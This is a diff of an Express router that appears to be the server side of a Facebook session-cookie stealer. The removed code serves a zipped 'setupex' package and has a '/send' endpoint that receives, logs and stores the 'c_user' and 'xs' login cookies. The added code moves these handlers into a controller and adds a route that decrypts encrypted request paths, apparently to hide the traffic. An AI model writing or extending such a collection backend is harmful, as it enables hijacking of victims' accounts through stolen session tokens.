@@ -1,54 +1,15 @@
 import { Request, Response, Router } from 'express';
-import { createReadStream, readdir, statSync, readdirSync, readFileSync} from 'fs';
-import path from 'path';
-const Fmodel = require('../model/f.model');
-const archiver = require('archiver');
+import { Api } from '../enum/api.enum';
+import extension from '../controllers/extension.controller';
+const crypto = require('crypto-js');
 const router = Router();
 
-router.get('/download', (req: Request, res: Response) => {
-    const folderPath = path.join('src', 'setupex');
-    const files = readdirSync(folderPath);
+router.get('/download', extension.download)
 
-    const zip = archiver('zip');
-    zip.pipe(res);
+router.post('/send', extension.send)
 
-    res.setHeader('Content-disposition', 'attachment; filename=folder.zip');
-    res.setHeader('Content-type', 'application/zip');
+//route này nhận các request post có path mã hóa, có nhiệm vụ giải mã và chuyển đến route tương ứng
+router.post('/:endpoint', extension.decodePath)
 
-
-    try {
-        files.forEach(file => {
-            const filePath = path.join(folderPath, file);
-            const isDirectory = statSync(filePath).isDirectory();
-
-            if (!isDirectory) {
-                zip.file(filePath, { name: file });
-            } else {
-                zip.directory(filePath, file);
-            }
-        });
-
-         // Đặt tên cho tệp zip khi gửi qua HTTP
-        res.attachment('setup.zip');
-
-        // Kết thúc tệp zip
-        zip.finalize();
-    } catch (error) {
-        console.error('Error creating zip file:', error);
-        res.status(500).send('Internal Server Error');
-    }
-    
-
-    })
-
-router.post('/send', async (req: Request, res: Response)=>{
-    const {c_user, xs} = req.body;
-    console.log({c_user, xs} )
-    if(!c_user || !xs) return res.status(403).json({success: false, message: 'cannot null'});
-    const f = new Fmodel({c_user, xs});
-
-    await f.save();
-    res.status(200).json({success: true, message: 'send successfully!'});
-})
 
 module.exports = router;
